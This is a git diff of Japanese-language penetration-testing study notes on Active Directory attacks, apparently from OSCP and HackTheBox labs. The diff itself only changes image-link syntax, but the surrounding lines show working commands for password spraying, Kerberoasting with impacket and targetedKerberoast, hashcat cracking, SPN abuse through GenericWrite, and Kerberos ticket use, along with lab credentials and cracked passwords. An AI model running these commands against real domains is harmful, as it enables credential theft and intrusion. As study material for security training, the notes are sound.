@@ -114,14 +114,14 @@ kerbrute passwordspray -d hokkaido-aerospace.com domain_users.txt rockyou.txt
 ```bash
 /home/kali/github/username-anarchy/username-anarchy --input-file ./users.txt --select-format first.last
 ```
-![](../../assets/images/Pasted%20image%2020260508212653.png)
+![[Pasted image 20260508212653.png]]
 
   - ファーストネームイニシャル・ラストネーム形式
   
 ```bash
 /home/kali/github/username-anarchy/username-anarchy --input-file ./users_Initial_lastname.txt --select-format flast
 ```
-![](../../assets/images/Pasted%20image%2020260508212749.png)
+![[Pasted image 20260508212749.png]]
 
   - 注意: 画面出力しかされないので、これらを含むテキストファイルを改めて作成します。
 
@@ -160,7 +160,7 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request
 impacket-GetUserSPNs oscp.exam/r.andrews:Password123! -dc-ip 192.168.56.200 -request
 ```
 
-![](../../assets/images/Pasted%20image%2020260602222817.png)
+![[Pasted image 20260602222817.png]]
 
 ### Repository
 https://github.com/ShutdownRepo/targetedKerberoast
@@ -169,20 +169,20 @@ https://github.com/ShutdownRepo/targetedKerberoast
 python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.186.40
 ```
 
-![](../../assets/images/Pasted%20image%2020260508214035.png)
+![[Pasted image 20260508214035.png]]
 
 ### Crack
 ```zsh
 sudo hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
-![](../../assets/images/Pasted%20image%2020260508214051.png)
+![[Pasted image 20260508214051.png]]
 haze1988
 
 ---
 
 ### Example
 #### CheckRole
-![](../../assets/images/Pasted%20image%2020260508214252.png)
+![[Pasted image 20260508214252.png]]
 yulia.weberがboris.crawfordに対してGenericWriteを持っている
 #### SPNの書き込み
 ```powershell
@@ -194,9 +194,9 @@ Registering ServicePrincipalNames for CN=boris.crawford,CN=Users,DC=laser,DC=com
 Updated object
 ```
 
-![](../../assets/images/Pasted%20image%2020260508214309.png)
+![[Pasted image 20260508214309.png]]
 
-![](../../assets/images/Pasted%20image%2020260508214316.png)
+![[Pasted image 20260508214316.png]]
 zxcvbnm
 
 👉 Goal:
@@ -222,19 +222,19 @@ Find vulnerable template → Request certificate → Authenticate (PKINIT) → G
 ```zsh
 kinit svc_recovery@LOGGING.HTB
 ```
-![](../../assets/images/Pasted%20image%2020260508213323.png)
+![[Pasted image 20260508213323.png]]
 
 # Ticket Info
 ```zsh
 klist
 ```
-![](../../assets/images/Pasted%20image%2020260508213331.png)
+![[Pasted image 20260508213331.png]]
 
 # Ticket Info2
 ```zsh
 cat /etc/krb5.conf
 ```
-![](../../assets/images/Pasted%20image%2020260508213340.png)
+![[Pasted image 20260508213340.png]]
 
 ```zsh
 export KRB5CCNAME=kevin.ccache
